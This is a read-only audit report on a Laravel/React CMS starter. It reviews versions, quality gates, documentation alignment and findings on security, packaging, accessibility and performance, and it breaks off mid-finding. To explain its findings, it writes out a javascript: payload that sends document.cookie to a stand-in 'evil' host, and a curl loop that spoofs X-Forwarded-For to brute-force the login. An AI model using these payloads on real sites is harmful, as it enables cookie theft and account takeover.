# Lattice — Independent Code Review and Gap Analysis

**Repository:** `dcizov/laravel-react-starter`
**Ref reviewed:** `arena/9b5e4224-laravel-react-starter` @ **`e71d4fd7a2e57df2ede7f484fd8aebafae8f83b6`**
**Review date:** 2026-10-24
**Review type:** read-only audit. No source file in the repository was modified.

---

## 1. Audit Scope and Reproducibility

### 1.1 What was reviewed

The audit was performed on a local checkout of the branch. The workspace's `.git` metadata had been
reset to the branch point (`ef986d1`) by the environment, so content equality was verified
explicitly rather than assumed:

```
git ls-tree -r e71d4fd  →  384 blobs
for each blob: git hash-object <file> compared to the ref's object id
→ mismatched=0  missing=0
```

Every tracked file in the workspace is byte-identical to `e71d4fd`. Findings therefore apply to that
commit, which is the branch head on `origin`.

Project size: 115 PHP files (~17.2k LOC in `app/`, `database/`, `routes/`, `config/`, `tests/`),
114 TSX + 17 TS files (~15.1k LOC in `resources/js/`), 20 migrations, 26 shadcn/ui components,
31 test files / ~182 test cases.

### 1.2 Versions actually in use

| Layer                                 | Declared                                             | Resolved / observed                           |
| ------------------------------------- | ---------------------------------------------------- | --------------------------------------------- |
| PHP                                   | `^8.3`                                               | 8.5 (CI pins 8.5)                             |
| Laravel                               | `^13.17`                                             | **13.36.0**                                   |
| inertiajs/inertia-laravel             | `^3.0`                                               | **3.5.1**                                     |
| `@inertiajs/react`, `@inertiajs/vite` | `^3.0.0`                                             | 3.x                                           |
| React / ReactDOM                      | `^19.2.0`                                            | 19.2.x                                        |
| TypeScript                            | `^5.7.2`                                             | 5.7+ (`strict: true`)                         |
| Tailwind CSS                          | `^4.0.0` + `@tailwindcss/vite`                       | 4.1.x (CSS-first config)                      |
| shadcn/ui                             | `components.json` style `new-york`, `rsc: false`     | 26 components in `resources/js/components/ui` |
| Vite                                  | `^8.0.0` (`vite-plus` 0.3.0)                         | 8.x                                           |
| Pest                                  | `^5.3`                                               | 5.3.2                                         |
| Larastan                              | `^3.9`                                               | 3.13.0, `level: 7`                            |
| Pint                                  | `^1.27`                                              | 1.32.1 (`preset: laravel`)                    |
| Node                                  | —                                                    | 22 (CI pins 22)                               |
| Database                              | `pgsql` in `.env.example`, `sqlite` in `phpunit.xml` | Postgres 18 (Sail), SQLite for tests          |

### 1.3 Checks executed in this audit environment

| Check                       | Command                                    | Result                                                                                                                                                                                                                                                                                                                                                                   |
| --------------------------- | ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Dependency reproducibility  | `npm ci --ignore-scripts`                  | **Pass** — 291 packages from `package-lock.json` in 9 s                                                                                                                                                                                                                                                                                                                  |
| Type check                  | `npm run types:check`                      | **Fail** — 40+ `TS2307` on `@/actions/*`, `@/routes/*` (generated, gitignored). See **M-02**.                                                                                                                                                                                                                                                                            |
| Lint                        | `npx eslint resources/js --max-warnings 0` | **Fail** — 5 `import-x/order` errors around `@/routes` (same root cause as M-02)                                                                                                                                                                                                                                                                                         |
| Production build            | `npm run build`                            | **Not verifiable here** — the Wayfinder plugin shells out to `php artisan wayfinder:generate`; no PHP runtime exists in this sandbox (`/bin/sh: php: not found`). Environment limitation, not a repository defect.                                                                                                                                                       |
| PHPUnit/Pest, Pint, PHPStan | —                                          | **Not re-executed.** `composer install` is unreachable (Packagist blocked) and the sandbox lost its PHP runtime, so `vendor/` does not exist. These gates were green at this exact commit earlier in the same session: **181 tests / 1330 assertions**, Pint 197 files, PHPStan level 7, `npm run build` 7.5 s. Treated below as _previously verified, not re-verified_. |
| Dependency advisories       | `npm audit --json`                         | **8 advisories: 0 low, 5 moderate, 0 high, 3 critical** — all in dev/build tooling (`vite-plus`, `vitest`, `tinypool`, `oxfmt`, `fast-uri`)                                                                                                                                                                                                                              |
| Composer advisories         | —                                          | **Not verifiable** (no `vendor/`, no Packagist access)                                                                                                                                                                                                                                                                                                                   |

### 1.4 Limitations and unverified areas

- **No browser.** Contrast ratios, real focus order, dialog trapping behavior in a real AT stack, and
  measured Web Vitals are **not verified**. Accessibility statements below are derived from source
  (markup, ARIA, Tailwind classes) and are marked accordingly.
- **No Docker.** `sail up -d`, the Postgres service and the `composer setup` flow were not executed
  here; they were exercised by the repository owner in a real Sail environment earlier.
- **No PHP runtime.** All PHP behaviour claims are from reading source, not from execution, except
  where a prior in-session run is explicitly cited.
- **Visual/UX judgements** (theme switching, double shell) reference the owner's screenshots; the
  underlying code paths were verified in source.

---

## 2. Executive Summary

**Overall assessment: a well-built, unusually disciplined CMS core with a small number of real defects
concentrated at the seams — content-editor → public HTML, generated artifacts → git, and
proxy/build configuration.**

The backend architecture is the strongest part of the repository: every mutation is authorized by a
policy or a `FormRequest::authorize()`, section content is validated from the same registry that
generates the editor (no schema drift by construction), invitations use hashed single-use tokens,
draft previews are signature-protected and `noindex`, uploads are MIME- and size-restricted with UUID
filenames, and the ability map is a deliberate two-query design with a documented rationale. Tests
target behaviour that matters (role matrix, addon lifecycle, deterministic seeding, dashboard query
budget) rather than chasing a count.

The defects that matter are not architectural. One is a **stored-XSS vector**: link fields are
validated as `string|max:255` and rendered straight into `href`, so a content editor can persist a
`javascript:` URL. Another is **`trustProxies(at: '*')`**, which lets any client spoof
`X-Forwarded-For` and thereby bypass the login rate limiter and poison audit data. Both are small
diffs. A third cluster is packaging: the **committed frontend registries encode one specific database
state**, so the documented install dirties the working tree and can block `git pull` — this has
already bitten the repository owner twice in practice — and the **Wayfinder-generated files that
`tsc` and ESLint require are gitignored**, so the documented quality gates cannot run on a fresh
clone before a build.

**Release readiness:** not yet, on two conditions that are cheap to meet — close H-01/H-02, and make
install/build/git agree (M-01, M-02). Everything else on the list is maintainability, accessibility
polish, or hardening that can ship iteratively. No critical (exploitable-without-privileges) issue
was found.

---

## 3. Official Documentation Alignment Matrix

| Source                                            | Version matched                                   | Aligned areas                                                                                                                                                                                                                                                                                                                         | Gaps                                                                                                                                                                                               | Status                                                         | Evidence                                                                                                                                                              |
| ------------------------------------------------- | ------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Laravel** (`github.com/laravel/docs`)           | 13.36                                             | FormRequests with `authorize()`; policies + explicit `Gate::policy`; `withCommands()` for custom command namespace; `DB::prohibitDestructiveCommands`; Fortify features incl. passkeys/2FA; `#[Fillable]` attribute; migrations with FKs, cascades, indexes; `Password::defaults`; `Inertia::defer`; schedule in `routes/console.php` | `trustProxies(at: '*')`; no rate limiting on the public invitation endpoint; password rules only enforced in production; Postgres path untested by the suite                                       | **Partially Aligned**                                          | `bootstrap/app.php:26`; `app/Http/Requests/Admin/*`; `routes/admin.php`; `app/Providers/AppServiceProvider.php:95`; `.github/workflows/tests.yml` vs `phpunit.xml:26` |
| **React** (`react.dev`)                           | 19.2                                              | Strict TS; no `dangerouslySetInnerHTML`; stable keys from ids; `useSyncExternalStore` for the theme store; compiler-enabled build; effects with cleanup                                                                                                                                                                               | Table headers inconsistent (`scope`/`caption`); one dead disabled control; no reduced-motion handling                                                                                              | **Aligned** (minor gaps)                                       | `resources/js/components/ui/sidebar.tsx`; `resources/js/pages/posts/index.tsx:207-226`; `resources/js/components/app-sidebar.tsx:38`                                  |
| **Inertia.js** (`inertiajs.com`)                  | v3 (`inflight-laravel` 3.5, `@inertiajs/react` 3) | Server owns state; typed page props; shared props as closures; deferred notifications; `useHttp` for autosave; `Inertia::render($c, $shell + [...])` avoids prop duplication; signed previews                                                                                                                                         | Layout ownership split between a global resolver and per-page `<AppLayout>` — the documented persistent-layout pattern is `Component.layout`; this dual source already produced a double-shell bug | **Partially Aligned**                                          | `resources/js/app.tsx:16-30`; `resources/js/layouts/admin-layout.tsx`; `resources/js/pages/admin/**/*.tsx` each render `<AppLayout>`                                  |
| **PHP** (`php.net/docs`)                          | 8.5                                               | Typed properties/params/returns; `readonly`; enums avoided in favour of typed constants; `final` on infrastructure classes                                                                                                                                                                                                            | **0 of 115 files declare `strict_types=1`**                                                                                                                                                        | **Partially Aligned**                                          | `grep -rl "declare(strict_types=1)" app \| wc -l` → `0`                                                                                                               |
| **shadcn/ui** (`ui.shadcn.com/docs/installation`) | Tailwind v4 setup                                 | `components.json` with `rsc:false`, `tsx:true`, CSS-variable theme, `@/components/ui` alias, Tailwind v4 CSS-first (no `tailwind.config`), components vendored locally, composition via Radix primitives                                                                                                                              | Generated primitives are correct; **composed** UI still needs a semantic pass (`aria-current`, `<caption>`)                                                                                        | **Aligned**                                                    | `components.json`; `resources/css/app.css`; `resources/js/components/ui/*`                                                                                            |
| _Supplementary:_ WCAG 2.2 AA                      | —                                                 | Landmarks, `lang`, labeled icon buttons (57 `aria-label`s), Radix dialogs (focus trap/Escape), `focus-visible` rings, `sr-only` captions on the pages table, keyboard-activatable media cards                                                                                                                                         | No skip link in the admin shell (2.4.1 A); no `aria-current` on the active nav item; posts table has no `scope`/`caption`; contrast unverified                                                     | **Partially Aligned**                                          | `resources/js/components/themes/theme-shell.tsx:77` (has skip link) vs `admin-layout.tsx:20` (none); `ui/sidebar.tsx:512`                                             |
| _Supplementary:_ OWASP (XSS/headers)              | —                                                 | No raw HTML rendering; Blade escaping; CSRF via Inertia; upload MIME allowlist; signed preview URLs; hashed invitation tokens                                                                                                                                                                                                         | URL schemes not validated (XSS); no CSP/`X-Content-Type-Options`/`Referrer-Policy`; unvalidated cookie into inline script                                                                          | **Significant Gaps** in the two named areas, otherwise aligned | `CoreSections.php:34,87`; `section-renderer.tsx:84,178`; `resources/views/app.blade.php:9-27`                                                                         |
| _Supplementary:_ Vite                             | 8                                                 | Laravel plugin, Wayfinder, React Compiler, per-page chunks, bundled fonts                                                                                                                                                                                                                                                             | `vite`, `typescript`, `@types/*`, `concurrently` in `dependencies` rather than `devDependencies`                                                                                                   | **Partially Aligned**                                          | `package.json`                                                                                                                                                        |
| _Supplementary:_ TypeScript                       | 5.7                                               | `strict: true`, `noImplicitAny: true`, shared prop types, generated Wayfinder types                                                                                                                                                                                                                                                   | Generated types are not present on a fresh clone (M-02)                                                                                                                                            | **Aligned**                                                    | `tsconfig.json:86-87`                                                                                                                                                 |

---

## 4. Principles Evaluation Matrix

| Category               | Principle                     | Status     | Evidence                                                                                                                                                                                                                             | Main gap                                                                                                                        | Recommended action                                                                                                                |
| ---------------------- | ----------------------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| Core engineering       | **DRY**                       | Good       | Section schema is generated once in PHP and consumed by editor, validation and TypeScript; `page-header`/`empty-state`/`error-state`/`confirm-dialog` shared components; single `AdminLayout`                                        | Two layout sources of truth (resolver + per-page `<AppLayout>`)                                                                 | Adopt `Component.layout` in `app.tsx` and delete per-page wrappers (also removes the class of bug that produced the double shell) |
| Core engineering       | **Separation of concerns**    | Strong     | `app/Cms/*` holds infrastructure (registries, repositories, boot, media, settings); controllers stay HTTP-shaped; `MediaLibrary` is HTTP-free by design; addons isolated behind manifests + a provider loader with `SafeMode`        | Blade template couples to a page component path                                                                                 | Keep; document the boundary in CI (e.g. forbid `App\Cms` importing `App\Addons`)                                                  |
| Core engineering       | **KISS**                      | Good       | No speculative abstractions; no service-repository ceremony around Eloquent; `Section::make` is a plain value object                                                                                                                 | `TrafficRepository`/`AbilityMap` justified; `pages/demo.tsx` sits in core while its route belongs to the Demo addon             | Move addon page components out of the core page tree                                                                              |
| Core engineering       | **Long-term sustainability**  | Good       | 182 tests, Larastan level 7, Pint, ESM/Prettier, CI with pinned action SHAs and `permissions: contents: read`, `PROGRESS.md` with deviations recorded, four docs files                                                               | Generated artifacts committed _and_ gitignored class of problems; `vendor/` absent means gates cannot be re-run without network | Make generated state deterministic and untracked-or-stable (M-01, M-02)                                                           |
| UX                     | **User needs first**          | Good       | Explicit empty/loading/error states on every list; undo affordances on destructive actions; optimistic toggles with revert + toast; autosave with save-state; readable invitation errors                                             | Dead "Search… ⌘K" control; global "New page" CTA on unrelated screens; featured image promised but nowhere visible              | Remove or implement the search affordance; make the top-bar CTA contextual                                                        |
| UX                     | **Accessibility**             | Partial    | Radix dialogs, labeled icon buttons, `focus-visible` rings, `sr-only` captions, `lang` from locale, decorative logo `alt=""` + link label                                                                                            | No admin skip link; no `aria-current`; posts table semantics; contrast unmeasured                                               | Add skip link + `aria-current`; finish table semantics; verify contrast in both themes                                            |
| UX                     | **Mobile-first / responsive** | Good       | Sidebar collapses to an icon rail and a mobile `Sheet`; tables hide secondary columns at breakpoints; `max-w-7xl` shells; media grid/list switch                                                                                     | `Card` wrappers use `overflow-hidden`, so anything wider clips rather than scrolls                                              | Prefer `overflow-x-auto` on table wrappers                                                                                        |
| Performance & security | **Web performance**           | Adequate   | Dashboard asserts ≤12 queries; `AbilityMap` 2 queries/request; settings cached; `Inertia::defer` for notifications; bundled Inter (no CDN); `AddLinkHeadersForPreloadedAssets`; per-page chunks                                      | Pages index issues 5 extra `COUNT`s; media index ships per-row usage detail + full morph models                                 | Aggregate counts in one query; send usage detail on demand                                                                        |
| Performance & security | **Non-negotiable security**   | Partial    | Policy-per-action, `FormRequest::authorize()` everywhere, hashed invitations, signed previews, MIME allowlist, no `dangerouslySetInnerHTML`, `#[Fillable]`, CSRF, `secure`/`httpOnly`/`lax` session cookie                           | **`javascript:` URL in content fields (H-01)**; **`trustProxies('*')` (H-02)**; no CSP                                          | Fix H-01/H-02; add a security-headers middleware, then a nonce-based CSP                                                          |
| Performance & security | **Progressive enhancement**   | Acceptable | Semantic HTML on the public site (`<header>`, `<nav>`, `<main>`, skip link, `<a>` links, RSS, `sitemap.xml`, `robots.txt`); 404s are real 404s; theme failures fall back to the core renderer (SafeMode) rather than white-screening | Client rendering is inherent to Inertia; the public site emits an empty `<div id="app">` for non-JS clients                     | Honest position: document the JS requirement; consider SSR if SEO without JS matters                                              |

---

## 5. Detailed Findings

Ordered by severity, then confidence. Severity reflects impact in a realistic deployment of this CMS;
it is not inflated for staff-only paths.

---

### H-01 — Link fields accept `javascript:` URLs and render them into `href` (stored XSS)

|                |                                                                                                                                                    |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**   | High                                                                                                                                               |
| **Confidence** | High                                                                                                                                               |
| **Source**     | OWASP XSS Prevention Cheat Sheet (URL attribute rules); Laravel validation docs (`url`, `active_url`); project principle _Non-Negotiable Security_ |
| **Files**      | `app/Cms/Sections/CoreSections.php:34`, `:87`; `resources/js/components/sections/section-renderer.tsx:84` (hero), `:178` (cta)                     |

**Current behaviour.** The two link fields are declared as

```php
Field::url('cta_url',    'Button link', ['rules' => ['string', 'max:255']]),
Field::url('button_url', 'Button link', ['rules' => ['string', 'max:255']]),
```

and rendered as `<a href={url}>` with no scheme check. `Field::url` is a _widget_ type (it chooses a
URL input in the inspector); it contributes no validation rule.

**Why it is a problem.** Validation therefore accepts any string, including `javascript:...`. React
escapes text and attribute values but does not neutralise the `javascript:` scheme in `href`; clicking
the button executes script in the site origin. The value is persisted in `pages.content` (JSON) and
re-rendered on every visit and in every preview.

**Impact / trigger.** An Author (own pages, no publishing needed for a preview link) or an Editor
saves a hero CTA with `javascript:fetch('//evil/'+document.cookie)`; the page goes live; every visitor
who clicks it runs the payload. Because signed previews render the same content inside the theme, an
administrator opening a shared preview is a plausible higher-value target. This is stored XSS with a
low-privilege author entry point.

**Expected state.** Link fields validate scheme, and the renderer refuses anything that is not
http(s)/relative — defence in depth, because content can also arrive from a seeder or an addon.

**Recommendation.**

1. Tighten the field rules: `['string', 'max:255', 'url:http,https']` for absolute links, or a regex
   accepting same-site relative paths (`#`, `/`, `?`) plus `http(s)`.
2. In `Hero`/`Cta`, drop non-http(s) values:
   `const safe = /^(https?:\/\/|\/)/i.test(url) ? url : null;` and render the button only when `safe`.
3. Add a regression test asserting a `javascript:` payload is rejected by `UpdatePageRequest`.

**Effort:** Small.

---

### H-02 — `trustProxies(at: '*')` allows client-controlled `X-Forwarded-For`, defeating IP-based throttling

|                |                                                                                 |
| -------------- | ------------------------------------------------------------------------------- |
| **Severity**   | High                                                                            |
| **Confidence** | Medium-High (depends on exposure; the code is unconditional)                    |
| **Source**     | Laravel docs, _Trusting proxies_ (`laravel.com/docs/requests#trusting-proxies`) |
| **File**       | `bootstrap/app.php:26`                                                          |

**Current behaviour.**

```php
// Lattice is meant to run behind a reverse proxy (TLS is terminated there).
$middleware->trustProxies(at: '*');
```

**Why it is a problem.** Trusting every proxy means `X-Forwarded-For` / `X-Forwarded-Proto` from an
arbitrary client are honoured. Laravel derives `$request->ip()` from that header, and Fortify's login
limiter keys on IP + username. A client that rotates a forged header per request never hits the
limit. The same header also feeds the activity log's causer context and any future IP allowlisting,
and `X-Forwarded-Proto: https` can be used to force `https://` URL generation.

**Impact / trigger.** Sail publishes the app port to the host, and a self-hosted deployment behind no
proxy (or behind one the operator does not control the header path for) is exactly the documented
Lattice target: `curl -H 'X-Forwarded-For: 10.9.9.<n>' -d 'email=admin@site.test&password=…' /login`
in a loop. Brute force succeeds at full speed against a 5/minute limiter.

**Expected state.** Trust only known proxy addresses.

**Recommendation.**

```php
$middleware->trustProxies(
    at: array_filter(explode(',', (string) env('TRUSTED_PROXIES', ''))),
    headers: Request::HEADER_X_FORWARDED_FOR | Request::HEADER_X_FORWARDED_PROTO,
);
```

and document `TRUSTED_PROXIES=172.16.0.0/12` (Docker bridge) in `.env.example`. Empty default = trust
nothing, which is correct for direct `artisan serve`/Sail access.

**Effort:** Small.

---

### M-01 — Committed frontend registries encode one database state, so the documented install dirties the tree

|                |                                                                                                                                                                                          |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                                                                                                                                   |
| **Confidence** | High                                                                                                                                                                                     |
| **Source**     | Project invariant “a step is done only when …”; Vite build-time code generation                                                                                                          |
| **Files**      | `resources/js/lib/generated/addons.ts` (tracked), `resources/js/lib/generated/navigation.ts` (tracked), `app/Cms/Repositories/AddonRepository.php:32`, `database/seeders/DemoSeeder.php` |

**Current behaviour.** `addons.ts` is committed with `PostCraft: active` (the _demo_ state) and
`Demo: inactive`. `AddonRepository::install()` writes status `inactive`; only `DemoSeeder` activates
PostCraft. Therefore `composer setup` (documented path, and what CI runs) installs both addons as
inactive, `lattice:discover` rewrites the file to `inactive`, and `git status` is dirty immediately
after a supported install. `navigation.ts` is likewise committed with the PostCraft “Posts” entry.

**Why it is a problem.** Two consequences. (a) `git pull` refuses to fast-forward on a dirty tree —
this happened twice to the repository owner during this project, and cost real debugging time.
(b) The committed registry describes a different world than a non-demo install: anyone who builds
before running `lattice:install` (or deploys a build produced on another machine) ships a sidebar with
a “Posts” link whose routes 404 because the addon is inactive.

**Expected state.** Generated artifacts used at build time should be reproducible from the repository
alone, or be regenerated by an unavoidable step and ignored by git.

**Recommendation (pick one).**

1. **Preferred:** stop tracking `resources/js/lib/generated/*`, add it to `.gitignore`, and let
   `composer setup` / `lattice:discover` create it — with a committed `.gitkeep` and a clear error in
   `lattice:doctor` when the folder is empty (the doctor already reports missing builds).
2. Keep tracking but commit the _neutral_ state (`inactive` for both addons) and never seed an active
   addon in a way that changes tracked files; add a test asserting `git status` is clean after
   `lattice:install`.
3. If tracking stays, add `composer setup` support for `git update-index --skip-worktree` — acceptable
   but leaky.

**Effort:** Small-Medium (option 1 touches install, CI, docs).

---

### M-02 — `tsc` and ESLint cannot run on a fresh clone: Wayfinder output is gitignored but required

|                |                                                                                                     |
| -------------- | --------------------------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                                              |
| **Confidence** | High (reproduced in this audit)                                                                     |
| **Source**     | TypeScript/Vite build ordering; project “quality gates” documentation                               |
| **Files**      | `.gitignore:10-12`, `resources/js/pages/settings/profile.tsx:3,10,11`, `composer.json` (`ci:check`) |

**Current behaviour.** `resources/js/actions`, `resources/js/routes` and `resources/js/wayfinder` are
generated by `@laravel/vite-plugin-wayfinder` during `vite build` — and are ignored by git. Verified in
this audit after a clean `npm ci`:

```
$ npm run types:check
resources/js/pages/settings/profile.tsx(3,31): error TS2307: Cannot find module
  '@/actions/App/Http/Controllers/Settings/ProfileController' …
(40+ identical errors)

$ npx eslint resources/js --max-warnings 0
resources/js/components/app-header.tsx
  36:1  error  `@/types` type import should occur before import of `@/routes`  import-x/order
… 5 problems
```

**Why it is a problem.** The README lists `npm run types:check` and `npx eslint …` as gates that “must
pass before a change is considered done”, but on a clone with no `public/build`, both fail for reasons
unrelated to the change. CI survives only because `composer setup` builds before `ci:check` runs; any
other consumer (IDE, pre-commit hook, a Node-only CI image) sees a broken repository.

**Impact / trigger.** New contributor runs the documented gates → 45 errors → assumes the project is
broken, or worse, “fixes” the import order and commits formatting churn.

**Expected state.** Either the generated types are present after `composer setup` _and_ documented as a
prerequisite, or the gates regenerate them first.

**Recommendation.**

1. Make the scripts self-sufficient: `"types:check": "php artisan wayfinder:generate --with-form && tsc --noEmit"`
   (and the same for the lint script), or
2. Add a `pretest`-style guard that prints “run `composer setup` or `npm run build` first” instead of 45
   `TS2307`s, and document the ordering in README’s “Quality gates”.
3. Either way, keep `resources/js/actions|routes|wayfinder` untracked (current choice is fine) and
   state the dependency explicitly.

**Effort:** Small.

---

### M-03 — Reserved slugs are not validated, so a page can be created that is unreachable

|                |                                                                                                               |
| -------------- | ------------------------------------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                                                        |
| **Confidence** | High                                                                                                          |
| **Source**     | Routing precedence (`routes/web.php`); UX principle _user needs first_                                        |
| **Files**      | `routes/web.php:31-38`, `app/Cms/Pages/Slugger.php:23-38`, `app/Http/Requests/Admin/UpdatePageRequest.php:29` |

**Current behaviour.** The public catch-all excludes reserved first segments
(`admin, api, login, logout, settings, preview, invitations, register, …`) via a negative lookahead.
`Slugger::unique()` normalises with `Str::slug()` and checks uniqueness only — never the reserved list.
Validation is `alpha_dash` with a length cap.

**Why it is a problem.** An author titling a page “Login” gets slug `login`, sees a success toast, and
the page is permanently shadowed by Fortify’s login route. The same applies to `admin`, `settings`,
`preview`, `invitations`. The failure is silent: publishing succeeds, the public URL serves something
else entirely.

**Impact / trigger.** Common titles in a real site: “Login”, “Admin”, “Preview”, “Register”.

**Expected state.** Reserved words are rejected at save time with a readable error, or are auto-suffixed
(`login-page`).

**Recommendation.** In `UpdatePageRequest` / `StorePageRequest`, add
`'not_in:'.implode(',', config('lattice.reserved_slugs'))` (move the `$reserved` array from
`routes/web.php` into config so the route and the validator share one list), and surface the message in
the editor’s slug field.

**Effort:** Small.

---

### M-04 — The admin shell has no skip link (WCAG 2.2 — 2.4.1 Bypass Blocks, Level A)

|                |                                                                                                            |
| -------------- | ---------------------------------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                                                     |
| **Confidence** | High (source); behaviour not observed in a browser                                                         |
| **Source**     | WCAG 2.2 AA 2.4.1; ARIA APG _Landmarks_                                                                    |
| **Files**      | `resources/js/layouts/admin-layout.tsx:14-26`, compare `resources/js/components/themes/theme-shell.tsx:77` |

**Current behaviour.** The public theme renders a “Skip to content” link. The admin shell renders
`<main>` but nothing before the sidebar. The sidebar contains ~9 links plus the sidebar trigger; every
admin screen therefore forces keyboard users through that list on each navigation.

**Why it is a problem.** Repeated blocks of navigation must be bypassable. A screen-reader or
switch-access user pays the same cost on every page of the CMS — the highest-traffic part of the app.

**Expected state.** First focusable element in the shell is a visually-hidden-until-focused link to
`#main-content`; `<main>` carries `id="main-content"` and `tabIndex={-1}`.

**Recommendation.** Reuse the theme’s pattern verbatim in `AdminLayout` (the markup already exists in
`theme-shell.tsx:77`), and add `aria-labelledby`/`id` wiring to `<main>`.

**Effort:** Small.

---

### M-05 — Active navigation item is styled but not announced (`aria-current` missing)

|                |                                                                                                        |
| -------------- | ------------------------------------------------------------------------------------------------------ |
| **Severity**   | Medium                                                                                                 |
| **Confidence** | High                                                                                                   |
| **Source**     | ARIA APG _Navigation_ pattern; WCAG 1.3.1 / 2.4.8                                                      |
| **Files**      | `resources/js/components/ui/sidebar.tsx:512`, `:680`; `resources/js/components/nav-sections.tsx:38-45` |

**Current behaviour.** `SidebarMenuButton` receives `isActive` and emits `data-active={isActive}` only
(shadcn’s default). Styling comes from `data-active`; no `aria-current` reaches the DOM.

**Why it is a problem.** Sighted users see which page they are on; screen-reader users are told nothing.
`aria-current="page"` is the standard mechanism and is a one-line addition in the primitive.

**Recommendation.** In `SidebarMenuButton`, when `asChild` is false add `aria-current={isActive ? 'page' : undefined}`;
for the `asChild` path (`<Link>`), pass the attribute through the child clone (shadcn’s `Slot` forwards props).

**Effort:** Small.

---

### M-06 — PostCraft featured images are schema-only: not editable, not rendered

|                |                                                                                                                                                                                                                                              |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                                                                                                                                                                                       |
| **Confidence** | High                                                                                                                                                                                                                                         |
| **Source**     | Project goal “real content, no dead features”; DRY of intent                                                                                                                                                                                 |
| **Files**      | `app/Addons/PostCraft/Models/Post.php:22,40,59`, `app/Addons/PostCraft/Http/Controllers/Admin/PostController.php:173,224`, `resources/js/pages/posts/edit.tsx` (no media field), `resources/js/pages/blog/index.tsx` / `show.tsx` (no image) |

**Current behaviour.** `featured_media_id` exists in the migration, `#[Fillable]`, a `featuredMedia()`
relation, admin validation (`Rule::exists('media','id')`) and the row payload. The demo seeder sets one
per post. But no admin screen offers a picker, and neither the blog index nor the post page renders it.

**Why it is a problem.** Three costs: the demo promises a capability it does not show (the seeded
`featured_media_id` is invisible everywhere, so the media usage/reporting data is misleading); the API
surface invites writes that the UI cannot produce; and a reviewer reasonably concludes a feature is
broken rather than absent.

**Expected state.** Either render it (card image on the index, hero image on the post, with `alt` from
the media record) or remove the column and the validation until it is implemented.

**Recommendation.** Implement the read path first (index card `<img>` with `width`/`height` and
`alt`), then the picker in `posts/edit.tsx` using the existing `media-picker` component. If deferred,
remove the seeder assignment and the validation rule so state and features agree.

**Effort:** Medium.

---

### M-07 — Media index ships per-row usage detail and eager-loads full morph models

|                |                                                                                |
| -------------- | ------------------------------------------------------------------------------ |
| **Severity**   | Medium                                                                         |
| **Confidence** | High                                                                           |
| **Source**     | Performance principle; Inertia prop-payload guidance                           |
| **Files**      | `app/Http/Controllers/Admin/MediaController.php:37-38`, `:236-255`, `:279-281` |

**Current behaviour.**

```php
->with(['uploader:id,name', 'folder:id,name', 'usages.usable'])
->withCount('usages')
…
'usages_detail' => $this->usageRows($media),   // for every row of the page
```

`usageRows()` maps each `MediaUsage` to `{id,title,field,url}`, resolving `usable` (a `Page` loaded with
**all** columns) for each usage. `usages.usable` is a morphTo relation: it costs one query per distinct
type but loads complete models. The detail panel that consumes this needs it only for the _selected_
item.

**Why it is a problem.** Payload and query cost scale with how often images are reused rather than with
page size: a library of 24 tiles × 10 usages each → 240 embedded objects, each derived from a fully
hydrated `Page`. The index needs the count (`usages_count`, already available) and the detail only on
selection.

**Recommendation.** Drop `usages_detail` from `row()`; add `GET admin/media/{media}/usages` (or an
`Inertia::optional`/`defer` prop) and fetch on select. Also select only the columns used
(`usages.usable` → `morphWith`/`constrain`) or store the page title denormalised in `media_usages`.

**Effort:** Small-Medium.

---

### M-08 — Pages index issues five redundant aggregate queries per view

|                |                                                                         |
| -------------- | ----------------------------------------------------------------------- |
| **Severity**   | Medium (low impact at demo scale, certain growth)                       |
| **Confidence** | High                                                                    |
| **Source**     | Laravel docs, query builder aggregates; project query-budget discipline |
| **File**       | `app/Http/Controllers/Admin/PageController.php:60-66`                   |

**Current behaviour.** Five `count()` calls (`all`, `draft`, `scheduled`, `published`, `trashed`) plus
the paginator’s own count. `status` is indexed, so each is cheap, but it is still five round trips for
a header strip, and the dashboard already demonstrates the right pattern (`selectRaw('status, count(*) as total')->groupBy('status')`).

**Recommendation.** One grouped query plus `withTrashed/onlyTrashed` counts:

```php
$byStatus = Page::query()->selectRaw('status, count(*) as total')->groupBy('status')->pluck('total','status');
$counts = ['all' => $byStatus->sum(), 'trashed' => Page::onlyTrashed()->count(), …];
```

Assert the index query count in a test, mirroring `DashboardTest`’s ≤12 budget.

**Effort:** Small.

---

### M-09 — CI runs Postgres, but the suite is pinned to SQLite: the production driver is untested

|                |                                                                                  |
| -------------- | -------------------------------------------------------------------------------- |
| **Severity**   | Medium                                                                           |
| **Confidence** | High                                                                             |
| **Source**     | Laravel docs, testing databases; CI reproducibility                              |
| **Files**      | `.github/workflows/tests.yml:17-43`, `phpunit.xml:26-27`, `tests/Pest.php:24-31` |

**Current behaviour.** The workflow provisions `postgres:18-alpine`, exports `DB_CONNECTION=pgsql` (and
creates a `testing` database via raw PDO), but `phpunit.xml` overrides `DB_CONNECTION=sqlite` +
`DB_DATABASE=database/testing.sqlite`. Every test runs on SQLite; the Postgres service and the
`testing` database are decorative.

**Why it is a problem.** The shipped default (`.env.example`, Sail) is Postgres, and the code contains
SQL that can behave differently per driver (`selectRaw('date(created_at) as day …')`,
`selectRaw('status, count(*) …')`, case sensitivity of `LIKE`, JSON column handling). A Postgres-only
regression would pass CI. Conversely, if SQLite is the intended test driver, the CI service is wasted
minutes and a misleading signal.

**Recommendation.** Choose one and make it explicit:

- **Test on Postgres** in CI (remove the `DB_CONNECTION` override there, drop `DB_DATABASE` pinning, add
  a `sqlite` matrix leg for local parity), or
- **Stay on SQLite** and delete the Postgres service + the `Create testing database` step, then state in
  the README that Postgres is supported but tested by hand.
  Note `tests/Pest.php` already creates `database/testing.sqlite` when missing, so the SQLite path is
